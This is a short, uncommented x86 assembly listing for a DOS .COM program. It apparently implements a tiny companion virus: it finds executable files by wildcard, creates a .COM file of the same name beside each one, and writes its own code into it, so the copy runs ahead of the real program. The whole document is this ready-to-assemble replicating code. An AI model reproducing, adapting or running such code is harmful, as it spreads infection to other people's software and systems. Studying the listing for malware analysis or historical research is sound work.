   .model tiny
   .386
   .code
       org 100h
   main:   db  '*.e*'
       mov dx,si

       mov ah,4eh
       int 21h

       mov di,9Eh


       push di
       mov ax,5B00h+'.'
   repne   scasb
       mov ds:[di],00000000+'MOC'
       pop  dx

       mov cx,si
       Call XXX
   XXX:    int 21h
       xchg ax,bx
       mov ah,40h
       mov dx,si
       ret
   end main
